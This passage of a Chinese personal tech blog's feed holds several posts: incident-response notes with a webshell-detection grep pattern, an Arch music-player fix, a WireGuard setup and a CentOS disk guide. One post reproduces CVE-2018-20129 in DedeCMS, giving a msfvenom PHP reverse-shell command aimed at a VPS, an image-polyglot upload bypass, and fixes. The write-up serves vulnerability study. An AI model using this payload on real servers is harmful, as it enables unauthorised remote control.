      CVE-2010-2883漏洞已经出来很久了，很多人已经分析复现过了，最近在搞pwn这块，准备把栈溢出弄一下，是adobereader中的一个0day，由于CoolType.dll中堆栈缓冲区溢出错误使攻击者通过pdf中的ttf字体在SING表中具有长字段PDF文档进行转换，当用户安全意识比较低的时候打开了具有恶意代码的pdf文件就有可能造成任意代码执行或拒绝服务。
    
    </summary>
    
    
      <category term="CVE" scheme="https://hexchristmas.github.io/tags/CVE/"/>
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>应急响应笔记</title>
    <link href="https://hexchristmas.github.io/2020/04/10/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/"/>
    <id>https://hexchristmas.github.io/2020/04/10/应急响应笔记/</id>
    <published>2020-04-10T14:36:32.000Z</published>
    <updated>2020-04-10T15:30:10.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="应急响应笔记"><a href="#应急响应笔记" class="headerlink" title="应急响应笔记"></a>应急响应笔记</h1><h2 id="如何快速排查webshell？"><a href="#如何快速排查webshell？" class="headerlink" title="如何快速排查webshell？"></a>如何快速排查webshell？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RPn &quot;(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab|yarra) *\(&quot; /var/www</span><br></pre></td></tr></table></figure><h2 id="Dump内存指令"><a href="#Dump内存指令" class="headerlink" title="Dump内存指令"></a>Dump内存指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcore PID</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f -o xxx -e trace=open -p &lt;PID&gt;</span><br></pre></td></tr></table></figure><h2 id="查找具体某天修改过的文件"><a href="#查找具体某天修改过的文件" class="headerlink" title="查找具体某天修改过的文件"></a>查找具体某天修改过的文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -newermt &quot;2018-11-27&quot; ! -newermt &quot;2018-11-29&quot;|xargs stat</span><br></pre></td></tr></table></figure><h2 id="查看对应进程占用的端口号"><a href="#查看对应进程占用的端口号" class="headerlink" title="查看对应进程占用的端口号"></a>查看对应进程占用的端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anop | grep PID</span><br></pre></td></tr></table></figure><h2 id="查看端口号"><a href="#查看端口号" class="headerlink" title="查看端口号"></a>查看端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anplt</span><br></pre></td></tr></table></figure><h2 id="没有netstat怎么办？"><a href="#没有netstat怎么办？" class="headerlink" title="没有netstat怎么办？"></a>没有netstat怎么办？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tunlpa</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk -F &apos;&quot;&apos; &apos;&#123;print $8&#125;&apos;|sort |uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat iis-ex190706.log |awk &apos;$2&gt;&quot;15:22:31&quot;&#123;print $2&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;&quot;[28/Jun/2019:01:16:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;$5&gt;=&quot;[28/Jun/2019:01:16:59&quot; &amp;&amp; $5&lt;=&quot;[28/Jun/2019:01:18:59&quot; &#123;print $5&#125;&apos; |more</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;split($5,array,&quot;[&quot;);if(array[2]&gt;=&quot;28/Jun/2019:01:15:59&quot; &amp;&amp; array[2]&lt;=&quot;28/Jun/2019:01:17:59&quot;)&#123;print $5&#125;&#125;&apos;  |more</span><br></pre></td></tr></table></figure><h2 id="访问指定资源的日志"><a href="#访问指定资源的日志" class="headerlink" title="访问指定资源的日志"></a>访问指定资源的日志</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log | awk &apos;&#123;print $10&#125;&apos; |grep /mobile/static/ |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><h2 id="访问URL排序"><a href="#访问URL排序" class="headerlink" title="访问URL排序"></a>访问URL排序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $10&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 10 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><h2 id="统计访问量前10的时间点"><a href="#统计访问量前10的时间点" class="headerlink" title="统计访问量前10的时间点"></a>统计访问量前10的时间点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $5&#125;&apos;|sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |cut -f 5 -d &apos; &apos; |sort|uniq -c|sort -rn|head</span><br></pre></td></tr></table></figure><h2 id="统计总流量"><a href="#统计总流量" class="headerlink" title="统计总流量"></a>统计总流量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;sum+=$13&#125; END &#123;print sum&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="状态码统计"><a href="#状态码统计" class="headerlink" title="状态码统计"></a>状态码统计</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat eee.access-0628.log |awk &apos;&#123;print $12&#125;&apos; |sort|uniq -c|sort -rn|more</span><br></pre></td></tr></table></figure><h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><ul><li>备份，备份，备份！</li><li>如果您不知道是谁发送了附件，请不要打开附件。</li><li>在您确认该人实际向您发送附件之前，请勿打开附件，</li><li>使用VirusTotal等工具扫描附件  。</li><li>确保所有Windows更新一出现就立即安装！还要确保更新所有程序，尤其是Java，Flash和Adobe Reader。较旧的程序包含恶意软件分发者通常利用的安全漏洞。因此，保持更新非常重要。</li><li>确保使用安装了某种使用行为检测或白名单技术的安全软件。白色上市可能是一种痛苦的训练，但如果你愿意购买它，可能会有最大的回报。</li><li>使用硬密码，不要在多个站点重复使用相同的密码。</li></ul>]]></content>
    
    <summary type="html">
    
      记录一些应急响应中的知识点，笔记，小tips。
    
    </summary>
    
    
      <category term="IncidentResponse" scheme="https://hexchristmas.github.io/tags/IncidentResponse/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-20129漏洞分析及复现</title>
    <link href="https://hexchristmas.github.io/2020/04/09/CVE-2018-20129%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
    <id>https://hexchristmas.github.io/2020/04/09/CVE-2018-20129漏洞分析及复现/</id>
    <published>2020-04-09T14:20:46.000Z</published>
    <updated>2020-04-10T15:18:49.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-20129漏洞分析及复现"><a href="#CVE-2018-20129漏洞分析及复现" class="headerlink" title="CVE-2018-20129漏洞分析及复现"></a>CVE-2018-20129漏洞分析及复现</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>Desdev DedeCMS 5.7 SP2版本中的uploads/include/dialog/select_images_post.php文件存在文件上传漏洞，远程攻击者可利用该漏洞上传并执行任意PHP代码。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>uploads/include/dialog/select_images_post.php存在文件上传漏洞，这个模块对应是会员中心—&gt;发表文章—&gt;上传图片。<br><img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/1.png" alt="1|690x387"><br><a href="http://10.11.0.63/uploads/member/content_list.php?channelid=1" target="_blank" rel="noopener">http://10.11.0.63/uploads/member/content_list.php?channelid=1</a><br>在审计select_images_post.php代码时发现36行过滤一些不正常的字符，在38行处判断了文件名是否包含了$cfg_imgtype。我们可以通过构造eee.p*hp 来进行绕过。<br> <img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/3.png" alt="3"> </p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>我们使用msfvenom -p php/meterpreter/reverse_tcp lhost=47.xx.xxx.xx l4port=7169 -f raw &gt;shell.php<br> <img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/4.png" alt="4|690x455"><br>此处，我们使用了一个vps来反弹shell。<br><img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/5.png" alt="5|690x499"><br>找了个比较滑稽的图片，将shell.php和图片打成图片马。<br>大概操作，sss.jpg shell.php &gt;&gt; eee.jpg。<br>我们使用BurpSuitePro来进行抓包重放。<br> <img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/6.png" alt="6|690x387"><br>通过curl去让服务器解析。<br> <img src="/2020/04/09/CVE-2018-20129漏洞分析及复现/7.png" alt="7|690x386"><br>成功返回shell。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ul><li>文件后缀名检测进行重写。</li><li>对上传文件名进行统一重命名，后缀名只允许为image type类型。</li><li>对上传文件夹进行限制，不允许执行php。</li></ul>]]></content>
    
    <summary type="html">
    
      CVE-2018-20129漏洞分析及复现
    
    </summary>
    
    
      <category term="CVE" scheme="https://hexchristmas.github.io/tags/CVE/"/>
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>arch网易云音乐无法中文问题</title>
    <link href="https://hexchristmas.github.io/2020/03/18/Archlinux%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%97%A0%E6%B3%95%E4%B8%AD%E6%96%87%E9%97%AE%E9%A2%98/"/>
    <id>https://hexchristmas.github.io/2020/03/18/Archlinux网易云音乐无法中文问题/</id>
    <published>2020-03-18T15:13:51.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arch网易云音乐无法中文问题"><a href="#arch网易云音乐无法中文问题" class="headerlink" title="arch网易云音乐无法中文问题"></a>arch网易云音乐无法中文问题</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>据开发者laomocode研究，linux网易云音乐是依赖深度的qcef的qt库。Ubuntu没有qcef这个库所以网易云就自带了qcef，但网易云自带的qcef貌似有问题，所以将网易云自带的qcef库删掉强制使用archlinux版本的qcef。但由于qcef包被官方源也没有同步到aur中，所以只能通过编译qcef进行安装。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/springzfx/archlinux &amp;&amp;cd archlinux</span><br></pre></td></tr></table></figure><h3 id="compile-qcef-1-1-6-时间会比较久一点建议开代理"><a href="#compile-qcef-1-1-6-时间会比较久一点建议开代理" class="headerlink" title="compile qcef 1.1.6,时间会比较久一点建议开代理"></a>compile qcef 1.1.6,时间会比较久一点建议开代理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd qcef</span><br><span class="line">makepkg -si</span><br></pre></td></tr></table></figure><h3 id="build"><a href="#build" class="headerlink" title="build"></a>build</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd netease-cloud-music</span><br></pre></td></tr></table></figure><h3 id="执行makepkg-si这步骤的时候会出现一点问题，会出现："><a href="#执行makepkg-si这步骤的时候会出现一点问题，会出现：" class="headerlink" title="执行makepkg -si这步骤的时候会出现一点问题，会出现："></a>执行makepkg -si这步骤的时候会出现一点问题，会出现：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">==&gt; Making package: netease-cloud-music 1.2.1-1 (Tue 03 Mar 2020 11:24:49 PM CST)</span><br><span class="line">==&gt; Checking runtime dependencies...</span><br><span class="line">==&gt; Checking buildtime dependencies...</span><br><span class="line">==&gt; Retrieving sources...</span><br><span class="line">  -&gt; Downloading netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb...</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">curl: (22) The requested URL returned error: 403 Forbidden</span><br><span class="line">==&gt; ERROR: Failure while downloading https://d1.music.126.net/dmusic/netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb</span><br><span class="line">    Aborting...</span><br></pre></td></tr></table></figure><p>看到这个不要慌，<br>经过这几天的折腾，发现了解决办法：<br>我尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://d1.music.126.net/dmusic/netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb</span><br></pre></td></tr></table></figure></p><p>md5sum之后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aeadfdd3b2153e468a505bcd28268824  netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb</span><br></pre></td></tr></table></figure></p><p>我<figure class="highlight ls"><figcaption><span>-alth```看了一下大小原来只有235，这一看就不对啊</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">-rw-r--r--  1 hacker users  235  3月 22 22:20 netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb</span><br></pre></td></tr></table></figure></p><p>我直接从chrome上下载在校验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1f47c7dc3d9ce46da8099e539ee8a74d  netease-cloud-music_1.2.1_amd64_ubuntu_20190428.deb</span><br></pre></td></tr></table></figure></p><p>这回就对上了，再次makepkg 就没问题了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">makepkg -si</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://aur.archlinux.org/packages/netease-cloud-music/?O=10&amp;PP=10" target="_blank" rel="noopener">https://aur.archlinux.org/packages/netease-cloud-music/?O=10&amp;PP=10</a><br><a href="https://github.com/springzfx/archlinux" target="_blank" rel="noopener">https://github.com/springzfx/archlinux</a><br><a href="https://github.com/springzfx/archlinux/issues/3" target="_blank" rel="noopener">https://github.com/springzfx/archlinux/issues/3</a><br><a href="https://gitee.com/laomocode/netease-cloud-music" target="_blank" rel="noopener">https://gitee.com/laomocode/netease-cloud-music</a><br><img src="/2020/03/18/Archlinux网易云音乐无法中文问题/netease.png" alt="netease-cloud-music"></p>]]></content>
    
    <summary type="html">
    
      填坑archlinux中网易云无法中文问题
    
    </summary>
    
    
      <category term="archlinux" scheme="https://hexchristmas.github.io/tags/archlinux/"/>
    
      <category term="netease-cloud-music" scheme="https://hexchristmas.github.io/tags/netease-cloud-music/"/>
    
  </entry>
  
  <entry>
    <title>Debian&amp;Archlinux部署Wireguard</title>
    <link href="https://hexchristmas.github.io/2020/03/03/Debian-Archlinux%E9%83%A8%E7%BD%B2Wireguard/"/>
    <id>https://hexchristmas.github.io/2020/03/03/Debian-Archlinux部署Wireguard/</id>
    <published>2020-03-03T14:52:22.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Debian-amp-Archlinux部署Wireguard"><a href="#Debian-amp-Archlinux部署Wireguard" class="headerlink" title="Debian&amp;Archlinux部署Wireguard"></a>Debian&amp;Archlinux部署Wireguard</h1><p>wireguard远程办公其实还是蛮爽的，安装比较简单</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install wireguard</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>然后把你们网管给你的私钥放在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">sudo vim /etc/wireguard/wg0.conf</span><br></pre></td></tr></table></figure></p><p>配置文件大概这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;</span><br><span class="line">[Interface]</span><br><span class="line">PrivateKey = $(cat client_privatekey)</span><br><span class="line">Address = 10.0.0.2/24</span><br><span class="line">DNS = 8.8.8.8</span><br><span class="line">MTU = 1420</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = $(cat server_publickey)</span><br><span class="line">Endpoint = 1.2.3.4:50814</span><br><span class="line">AllowedIPs = 0.0.0.0/0, ::0/0</span><br><span class="line">PersistentKeepalive = 25 &quot; &gt; client.conf</span><br></pre></td></tr></table></figure></p><p>你的ifconfig信息大概这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">➜  ifconfig                                                              ✔  23:29:15</span><br><span class="line">lo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 16384</span><br><span class="line">options=1203&lt;RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP&gt;</span><br><span class="line">inet 127.0.0.1 netmask 0xff000000</span><br><span class="line">inet6 ::1 prefixlen 128</span><br><span class="line">inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">gif0: flags=8010&lt;POINTOPOINT,MULTICAST&gt; mtu 1280</span><br><span class="line">stf0: flags=0&lt;&gt; mtu 1280</span><br><span class="line">XHC20: flags=0&lt;&gt; mtu 0</span><br><span class="line">en0: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=6b&lt;RXCSUM,TXCSUM,VLAN_HWTAGGING,TSO4,TSO6&gt;</span><br><span class="line">ether 80:fa:5b:64:6e:a6</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect (&lt;unknown type&gt;)</span><br><span class="line">status: inactive</span><br><span class="line">en1: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">ether 18:4f:32:f4:7e:a3</span><br><span class="line">inet6 fe80::1c97:67ed:68fb:d0ee%en1 prefixlen 64 secured scopeid 0x6</span><br><span class="line">inet6 2408:8207:c9a:2db0:1b:b572:56e0:4cac prefixlen 64 autoconf secured</span><br><span class="line">inet6 2408:8207:c9a:2db0:a0f4:631b:7637:1b83 prefixlen 64 autoconf temporary</span><br><span class="line">inet 10.10.10.5 netmask 0xffffff00 broadcast 10.10.10.255nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">p2p0: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 2304</span><br><span class="line">ether 0a:4f:32:f4:7e:a3</span><br><span class="line">media: autoselect</span><br><span class="line">status: inactive</span><br><span class="line">awdl0: flags=8943&lt;UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1484</span><br><span class="line">ether 5a:14:bb:ea:17:7a</span><br><span class="line">inet6 fe80::5814:bbff:feea:177a%awdl0 prefixlen 64 scopeid 0x8</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">utun0: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 2000</span><br><span class="line">inet6 fe80::2c3b:78b4:b948:a51f%utun0 prefixlen 64 scopeid 0x9</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">utun1: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 1380</span><br><span class="line">inet6 fe80::83f5:8460:590a:6ae1%utun1 prefixlen 64 scopeid 0xa</span><br><span class="line">nd6 options=201&lt;PERFORMNUD,DAD&gt;</span><br><span class="line">vnic0: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=3&lt;RXCSUM,TXCSUM&gt;</span><br><span class="line">ether 00:1c:42:00:00:08</span><br><span class="line">inet 10.211.55.2 netmask 0xffffff00 broadcast 10.211.55.255</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br><span class="line">vnic1: flags=8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500</span><br><span class="line">options=3&lt;RXCSUM,TXCSUM&gt;</span><br><span class="line">ether 00:1c:42:00:00:09</span><br><span class="line">inet 10.37.129.2 netmask 0xffffff00 broadcast 10.37.129.255</span><br><span class="line">media: autoselect</span><br><span class="line">status: active</span><br></pre></td></tr></table></figure></p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wg-qucik up wg0</span><br><span class="line">wg-quick down wg0</span><br></pre></td></tr></table></figure><h1 id="Archlinux-Wireguard"><a href="#Archlinux-Wireguard" class="headerlink" title="Archlinux Wireguard"></a>Archlinux Wireguard</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>我后来尝试在manjaro上部署wireguard，但是wireguard告诉我，不支持我的内核，窝头。。。<br><img src="/2020/03/03/Debian-Archlinux部署Wireguard/1.jpeg" alt="lALPD2eDJ_4-MKnNA-TNBCI_1058_996|531x500"> </p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>当我执行以下命令检查内核模块的时候,告诉我没有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modprobe wireguard &amp;&amp; lsmod | grep wireguard</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modprobe: FATAL: Module wireguard not found</span><br></pre></td></tr></table></figure><p>查看内核版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uanme -a</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux lazy 5.3.18-1-MANJARO #1 SMP PREEMPT Wed Dec 18 18:34:35 UTC 2019 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers</span><br></pre></td></tr></table></figure><p>他会提示一些内核版本，你需装符合你内核版本的linux-header即可<br><img src="/2020/03/03/Debian-Archlinux部署Wireguard/2.png" alt="2020-02-28_23-52|650x270"><br>这次再去启动，就没有问题了<br><img src="/2020/03/03/Debian-Archlinux部署Wireguard/3.jpeg" alt="lALPD2eDJ_4-MKrNA5fNBB0_1053_919|572x500"></p>]]></content>
    
    <summary type="html">
    
      wireguard远程办公其实还是蛮爽的，安装比较简单
    
    </summary>
    
    
      <category term="Archlinux" scheme="https://hexchristmas.github.io/tags/Archlinux/"/>
    
      <category term="Debian" scheme="https://hexchristmas.github.io/tags/Debian/"/>
    
      <category term="wireguard" scheme="https://hexchristmas.github.io/tags/wireguard/"/>
    
  </entry>
  
  <entry>
    <title>Centos7扩容</title>
    <link href="https://hexchristmas.github.io/2020/02/23/Centos7%E6%89%A9%E5%AE%B9/"/>
    <id>https://hexchristmas.github.io/2020/02/23/Centos7扩容/</id>
    <published>2020-02-23T14:54:00.000Z</published>
    <updated>2020-04-09T11:10:57.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Centos7扩容"><a href="#Centos7扩容" class="headerlink" title="Centos7扩容"></a>Centos7扩容</h1><p>只写了命令大概是怎么用的，我自己理解的解释没写，你们自己百度理解一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l /* 列出磁盘 */</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q1.png" alt="WX20200228-210617|661x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk /dev/vda /*vda即你要扩容的那块盘，进行分区*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q2.png" alt="WX20200228-210726|538x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partprobe /*为了让系统识别新的分区*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q3.png" alt="WX20200228-210937|550x500"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvcreate /dev/vda3 /*将物理硬盘初始化为物理卷*/</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/23/Centos7扩容/q4.png" alt="WX20200228-210937|550x500"> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgscan /*查看所有卷组,重点看卷组名称*/</span><br></pre></td></tr></table></figure><p><img src="/2020/02/23/Centos7扩容/q5.png" alt="WX20200228-211010|690x153"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 